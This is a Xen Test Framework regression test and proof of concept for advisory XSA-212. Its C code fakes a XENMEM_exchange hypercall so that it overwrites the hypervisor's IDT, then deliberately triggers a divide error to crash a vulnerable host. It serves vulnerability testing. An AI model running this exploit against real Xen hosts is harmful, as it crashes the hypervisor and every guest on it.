/**
 * @file tests/xsa-212/main.c
 * @ref test-xsa-212
 *
 * @page test-xsa-212 XSA-212
 *
 * Advisory: [XSA-212](http://xenbits.xen.org/xsa/advisory-212.html)
 *
 * The XENMEM_exchange hypercall previously had incomplete checks on the
 * safety of the parameters passed.  XENMEM_exchange takes an input and output
 * array of gfns, along with a count of how many requests have been completed
 * thus far (in the case that continuation needs to occur).
 *
 * Xen only checked the base of the array, not the current access in the
 * array, for safety.  This would have been safe had Xen worked all the way
 * from 0, because hitting the non-canonical region would have aborted the
 * hypercall midway through.  However, nothing stops a crafty guest from
 * faking up a single-entry exchange which appears to be a very long way into
 * a large array.
 *
 * Construct such an exchange, with the output array set up to clobber the
 * first 8 bytes of the IDT.  If vulnerable, Xen will write junk over its @#DE
 * handler; an exception which is trivial to trigger.  As @#DE is a
 * contributory exception, it will escalate to @#DF and cause Xen to crash.
 *
 * @see tests/xsa-212/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-212 PoC";

void test_main(void)
{
    unsigned int i;
    desc_ptr idtr;

    sidt(&idtr);

    /* Exchange away PFN 0. */
    unsigned long in_extents[] = { pfn_to_mfn(0) };
    unsigned long pxt = _u(in_extents);
    unsigned long exchanged_so_far = idtr.base / 8;

    struct xen_memory_exchange mx =
    {
        .in = {
            .extent_start = _p(pxt - idtr.base),
            .nr_extents = exchanged_so_far + 1,
            .extent_order = PAGE_ORDER_4K,
            .mem_flags = 0,
            .domid = DOMID_SELF,
        },
        .out = {
            .extent_start = NULL,
            .nr_extents = exchanged_so_far + 1,
            .extent_order = PAGE_ORDER_4K,
            .mem_flags = 32,
            .domid = DOMID_SELF,
        },
        .nr_exchanged = exchanged_so_far,
    };

    /*
     * This test can race with being rescheduled across pcpus.  Retry up to
     * three times if XENMEM_exchange looks vulnerable, but Xen didn't crash
     * when trying to handle the divide error.
     */
    for ( i = 0; i < 3; ++i )
    {
        int rc = hypercall_memory_op(XENMEM_exchange, &mx);

        if ( rc == 0 )
            xtf_failure("Fail: XENMEM_exchange returned success\n");
        else
            printk("XENMEM_exchange returned %d\n", rc);

        printk("Probably %svulnerable to XSA-212\n", rc == 0 ? "" : "not ");

        unsigned int hi = 0, low = 1;
        exinfo_t fault = 0;

        printk("Attempting to confirm...\n");

        asm volatile ("1: div %%ecx; 2:"
                      _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                      : "+&a" (low), "+&d" (hi), "+D" (fault)
                      : "c" (0), [rec] "p" (ex_record_fault_edi));

        if ( fault == EXINFO_SYM(DE, 0) )
        {
            if ( rc == 0 )
            {
                printk("Apparent clobber, but got #DE.  Retrying...\n");
                continue;
            }
            xtf_success("Success: Got #DE as expected\n");
        }
        else
            xtf_error("  Error: Unexpected fault %#x, %pe\n", fault, _p(fault));

        break;
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
